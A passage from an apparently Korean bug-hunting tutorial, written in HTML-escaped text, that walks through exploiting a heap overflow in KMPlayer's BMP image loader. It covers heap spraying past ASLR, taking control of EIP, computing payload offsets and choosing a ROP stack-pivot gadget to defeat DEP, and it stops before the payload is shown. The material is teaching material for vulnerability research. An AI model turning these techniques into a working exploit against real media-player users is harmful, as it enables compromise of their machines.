&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Header &amp;#xC8FC;&amp;#xC18C; &amp;#xAE30;&amp;#xC900;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;size&lt;/code&gt; &amp;#xB9CC;&amp;#xD07C; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7F0; &amp;#xB2E4;&amp;#xC74C; &amp;#xBC11;&amp;#xC5D0; &amp;#xBAA8;&amp;#xB4E0; &amp;#xBD84;&amp;#xAE30;&amp;#xB97C; &amp;#xAC74;&amp;#xB108;&amp;#xB6F0;&amp;#xACE0; &lt;code&gt;sub_41AAF0&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xAC11;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xC2A4;&amp;#xD2B8;&amp;#xB9BC;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;byte_4BA6F4[size_bool] * header-&amp;gt;biClrUsed = 0x800&lt;/code&gt; &amp;#xB9CC;&amp;#xD07C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC11C; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;!!!! &amp;#xC544;&amp;#xAE4C; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xC598;&amp;#xAE30;&amp;#xD588;&amp;#xB4EF;&amp;#xC774; header &amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xB294; &lt;code&gt;size+0x40c&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xADFC;&amp;#xB370; &amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;header+size&lt;/code&gt; &amp;#xC5D0; &lt;code&gt;0x800&lt;/code&gt; &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xB2C8; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB97C; &amp;#xB36E;&amp;#xAC8C; &amp;#xB418;&amp;#xB294; &amp;#xAC70;&amp;#xC8E0;!! &amp;#xADF8;&amp;#xB7FC; &amp;#xAC1D;&amp;#xCCB4;&amp;#xAC00; &amp;#xB36E;&amp;#xC774;&amp;#xAE30; &amp;#xC804;&amp;#xACFC; &amp;#xD6C4;&amp;#xB97C; &amp;#xD55C;&amp;#xBC88; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;!!&lt;/p&gt;
&lt;p&gt;Before:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--058.png&#34; alt=&#34;bughunting-tutorials-part4/image--058.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;After:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--060.png&#34; alt=&#34;bughunting-tutorials-part4/image--060.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xD5E4;&amp;#xD5FF; &amp;#xC790; &amp;#xC774;&amp;#xC81C; &amp;#xADF8;&amp;#xB7FC; &lt;code&gt;eip&lt;/code&gt;&amp;#xB97C; &amp;#xC7A1;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xB124;&amp;#xC694;!!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--062.png&#34; alt=&#34;bughunting-tutorials-part4/image--062.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB124;&amp;#x2026;.? &amp;#xBB58; &amp;#xC7A1;&amp;#xB294;&amp;#xB2E4;&amp;#xB294; &amp;#xAC70;&amp;#xC8E0;&amp;#x2026;.? &amp;#xC96C;&amp;#xB975;&amp;#x2026;. &amp;#x3160;&amp;#x3160; &amp;#xD6C4;&amp;#xC6B0; &amp;#xC5ED;&amp;#xC2DC; &amp;#xC778;&amp;#xC0DD;&amp;#xC740; &amp;#xD5D8;&amp;#xB09C;&amp;#xD558;&amp;#xB124;&amp;#xC694;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xC73C;&amp;#xC74C;&amp;#x2026; &amp;#xC774;&amp;#xC81C; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xD558;&amp;#xB098;&amp;#xD558;&amp;#xB098; &amp;#xD574;&amp;#xACB0;&amp;#xD574; &amp;#xB098;&amp;#xAC08;&amp;#xAC8C;&amp;#xC694; &amp;#x3160;&amp;#x3160;&lt;br&gt;&amp;#xBA3C;&amp;#xC800; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xC5D0; Access violation&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC740; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xB123;&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xACA0;&amp;#xC8E0;!! &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC;!!! ASLR&amp;#xC774; &amp;#xAC78;&amp;#xB824;&amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xADF8;&amp;#xB807;&amp;#xAC8C; &amp;#xD558;&amp;#xB294; &amp;#xAC8C; &amp;#xC27D;&amp;#xC9C0; &amp;#xC54A;&amp;#xB2E4;&amp;#xB294; &amp;#xAC70;&amp;#x2026;. &amp;#xADF8;&amp;#xB807;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E4;&amp;#xD589;&amp;#xD788;(??) KMPlayer&amp;#xC640; ImLoader&amp;#xAC00; 32 &amp;#xBE44;&amp;#xD2B8;&amp;#xB85C; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xD558;&amp;#xBA74; &amp;#xC5B4;&amp;#xB290; &amp;#xC815;&amp;#xB3C4; &amp;#xB9B4;&amp;#xB77C;&amp;#xC774;&amp;#xC5B4;&amp;#xBE14;&amp;#xD558;&amp;#xAC8C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xB9E4;&amp;#xD551;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xD06C;&amp;#xAE30;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC790;&amp;#xC8FC; &amp;#xB9E4;&amp;#xD551;&amp;#xB418;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xB2EC;&amp;#xB77C;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC800;&amp;#xB294; &amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C; 150M &amp;#xC815;&amp;#xB3C4;&amp;#xB97C; 0x11&amp;#xB85C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;150M&amp;#xB85C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xD55C; &amp;#xC774;&amp;#xC720;&amp;#xB294; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xD560; &amp;#xB54C; &amp;#xC774; &amp;#xC815;&amp;#xB3C4; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; &amp;#xAC00;&amp;#xC7A5; &amp;#xC801;&amp;#xB2F9;&amp;#xD55C; &amp;#xC18D;&amp;#xB3C4;&amp;#xAC00; &amp;#xB098;&amp;#xC640;&amp;#xC11C; &amp;#xC778;&amp;#xB370;&amp;#xC694;. &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xD560; &amp;#xB54C; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xC774; &amp;#xC548;&amp;#xB418;&amp;#xBA74; &amp;#xB2E4;&amp;#xC2DC; &amp;#xC2DC;&amp;#xC791;&amp;#xD574;&amp;#xC11C; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xD574;&amp;#xC57C; &amp;#xB418;&amp;#xC796;&amp;#xC544;&amp;#xC694;? &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; &amp;#xCEE4;&amp;#xC9C0;&amp;#xBA74; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xC774; &amp;#xB354; &amp;#xC798;&amp;#xB418;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0;&amp;#xAC00; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xD558;&amp;#xBA74; &amp;#xD560;&amp;#xC218;&amp;#xB85D; &amp;#xB79C;&amp;#xB364; &amp;#xB9C8;&amp;#xC774;&amp;#xC9D5;&amp;#xC774; &amp;#xC798;&amp;#xB3FC;&amp;#xC11C; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; &amp;#xCEE4;&amp;#xB3C4; &amp;#xC798; &amp;#xC548;&amp;#xB418;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#xC694; &amp;#x3160;&amp;#x3160;(&amp;#xC608;&amp;#xC804;&amp;#xC5D0;&amp;#xB294; 300M &amp;#xB9CC; &amp;#xD574;&amp;#xB3C4; &amp;#xAC70;&amp;#xC758; &amp;#xACE0;&amp;#xC815;&amp;#xC774;&amp;#xB77C;&amp;#xACE0; &amp;#xB4E4;&amp;#xC5C8;&amp;#xB294;&amp;#xB370;&amp;#x2026;) &amp;#xAC00;&amp;#xC7A5; &amp;#xD6A8;&amp;#xC728;&amp;#xC801;&amp;#xC774;&amp;#xB77C;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xB294; &amp;#xD06C;&amp;#xAE30;&amp;#xB85C; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB9CC;&amp;#xC57D; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xB85C; &amp;#xC798; &amp;#xB41C;&amp;#xB2E4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC798; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--064.png&#34; alt=&#34;bughunting-tutorials-part4/image--064.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC774;&amp;#xB300;&amp;#xB85C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74;!!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--066.png&#34; alt=&#34;bughunting-tutorials-part4/image--066.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC9DD;&amp;#xC9DD;&amp;#xC9DD;!! &lt;code&gt;eip&lt;/code&gt;&amp;#xB97C; &amp;#xC7A1;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!!! &amp;#xC18C;&amp;#xB9AC;&amp;#xC9C8;&amp;#xB7EC;&amp;#xC5B4;&amp;#xC5B4;&amp;#xC5B4;&amp;#xC5B4;&amp;#xC5B4;&amp;#xC5B4;!!!! (&amp;#xD558;&amp;#x2026; &amp;#xD5D8;&amp;#xB09C;&amp;#xD588;&amp;#xB2E4;&amp;#x2026;) &amp;#xC774;&amp;#xC81C; &amp;#xC775;&amp;#xC2A4;&amp;#xB9CC; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694; &amp;#x314E;&amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;#xC77C;&amp;#xB2E8; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &lt;code&gt;eip&lt;/code&gt;&amp;#xB97C; &amp;#xC7A1;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xD568; &amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;. &amp;#xC77C;&amp;#xB2E8; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xB9AC;&amp;#xD134; &amp;#xC5B4;&amp;#xB4DC;&amp;#xB808;&amp;#xC2A4;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xC11C; &amp;#xC5B4;&amp;#xB514;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;call&lt;/code&gt; &amp;#xD639;&amp;#xC740; &lt;code&gt;jmp&lt;/code&gt;&amp;#xB97C; &amp;#xD588;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--068.png&#34; alt=&#34;bughunting-tutorials-part4/image--068.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--070.png&#34; alt=&#34;bughunting-tutorials-part4/image--070.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xB9AC;&amp;#xD134; &amp;#xC5B4;&amp;#xB4DC;&amp;#xB808;&amp;#xC2A4;&amp;#xB97C; &amp;#xBCF4;&amp;#xB2C8; &lt;code&gt;ImLoader+0x357f&lt;/code&gt; &amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xC774; &amp;#xC8FC;&amp;#xC18C;&amp;#xBCF4;&amp;#xB2E4; &amp;#xC704;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; instruction&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &lt;code&gt;call dword ptr [ecx-4]&lt;/code&gt;&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;ecx&lt;/code&gt;&amp;#xB294; &lt;code&gt;eax&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC838;&amp;#xC628; &amp;#xAC83;&amp;#xC774;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--072.png&#34; alt=&#34;bughunting-tutorials-part4/image--072.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xAC70;&amp;#xB294; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;(&amp;#xC704;&amp;#xCE58;??)&amp;#xC774; &lt;code&gt;eax&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC774; &amp;#xC77C;&amp;#xCE58;&amp;#xD558;&amp;#xB0D0;&amp;#xB294; &amp;#xAC83;&amp;#xC778;&amp;#xB370;&amp;#xC694;. &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C; &amp;#xC77C;&amp;#xB2E8; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--074.jpg&#34; alt=&#34;bughunting-tutorials-part4/image--074.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xAC00; &amp;#xC804;&amp;#xCCB4; &amp;#xBE44;&amp;#xD2B8;&amp;#xB9F5; &amp;#xC774;&amp;#xBBF8;&amp;#xC9C0;&amp;#xB97C; &amp;#xB2F4;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xAE30;&amp;#xC900;&amp;#xC73C;&amp;#xB85C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;0x11111111 &amp;#x2013; 0x101cb056 = 0xF460BB&lt;/code&gt; &amp;#xB124;&amp;#xC694;. &amp;#xC55E;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB97C; &amp;#xB36E;&amp;#xC744; &amp;#xB54C;&amp;#xC5D0;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xAE30;&amp;#xC900;&amp;#xC73C;&amp;#xB85C; &amp;#xC55E;&amp;#xBD80;&amp;#xBD84; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xB2F4;&amp;#xB294; &amp;#xB370;&amp;#xC5D0;&amp;#xB294; &amp;#xD070; &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xC5C6;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!!&lt;/p&gt;
&lt;p&gt;&amp;#xC790; &amp;#xC774;&amp;#xC81C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; MONA&amp;#xC640; &amp;#xBA54;&amp;#xD0C0;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xBAA8;&amp;#xB4C8;&amp;#xB4E4;&amp;#xC758; &amp;#xBBF8;&amp;#xD2F0;&amp;#xAC8C;&amp;#xC774;&amp;#xC158; &amp;#xC801;&amp;#xC6A9; &amp;#xD56D;&amp;#xBAA9;, &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAC00;&amp;#xC82F; &amp;#xAC80;&amp;#xC0C9;, &amp;#xC258; &amp;#xCF54;&amp;#xB4DC; &amp;#xC0DD;&amp;#xC131;&amp;#xC744; &amp;#xD574;&amp;#xC57C; &amp;#xD558;&amp;#xB294; &amp;#xB370; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &amp;#xC778;&amp;#xD130;&amp;#xB137;&amp;#xC744; &amp;#xAC80;&amp;#xC0C9;&amp;#xD558;&amp;#xBA74; &amp;#xB9CE;&amp;#xC774; &amp;#xB098;&amp;#xC624;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC0DD;&amp;#xB7B5;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xACB0;&amp;#xB860;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;KMPlayer.exe&lt;/code&gt; &amp;#xC5D0; Rebase&amp;#xAC00; &amp;#xC548; &amp;#xAC78;&amp;#xB824;&amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &lt;code&gt;KMPlayer.exe&lt;/code&gt; &amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xACE0;&amp;#xC694;, &amp;#xBA54;&amp;#xD0C0;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xD1B5;&amp;#xD574;&amp;#xC11C;&amp;#xB294; &amp;#xACC4;&amp;#xC0B0;&amp;#xAE30;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; &amp;#xC258; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC77C;&amp;#xB2E8; ASLR&amp;#xC740; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB85C; &amp;#xC5B4;&amp;#xB290; &amp;#xC815;&amp;#xB3C4; &amp;#xCEE4;&amp;#xBC84;&amp;#xD558;&amp;#xC600;&amp;#xACE0; DEP&amp;#xB9CC; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xC2DC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC258; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. DEP&amp;#xB97C; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xD558;&amp;#xB824;&amp;#xBA74; ROP&amp;#xB97C; &amp;#xD574;&amp;#xC57C;&amp;#xC8E0;!! &amp;#xC774;&amp;#xC81C; &lt;code&gt;esp&lt;/code&gt;&amp;#xB97C; &amp;#xC6B0;&amp;#xB9AC; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC788;&amp;#xB294; &amp;#xD799; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB85C; &amp;#xD53C;&amp;#xBD07; &amp;#xC2DC;&amp;#xD0AC; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC74C; &amp;#xC801;&amp;#xB2F9;&amp;#xD55C; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xC8E0;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x00523702&lt;/span&gt; : # PUSH ECX # POP ESP # POP ESI # POP EBX # RETN&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC77C;&amp;#xBD80;&amp;#xB85C; &amp;#xB450; &amp;#xBC88; &amp;#xB354; &lt;code&gt;POP&lt;/code&gt; &amp;#xD574;&amp;#xC8FC;&amp;#xB294; &amp;#xC774;&amp;#xC720;&amp;#xB294; &amp;#xC704;&amp;#xC5D0; &amp;#xBCF4;&amp;#xC2DC;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; 8 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xAC00; &amp;#xB2E4;&amp;#xB978; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB85C; &amp;#xB36E;&amp;#xC5EC; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774; 8 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xB6F0;&amp;#xC5B4;&amp;#xB118;&amp;#xACE0; &amp;#xB9AC;&amp;#xD134;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD568;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC790; &amp;#xADF8;&amp;#xB7EC;&amp;#xBA74; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD560; &amp;#xB54C; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
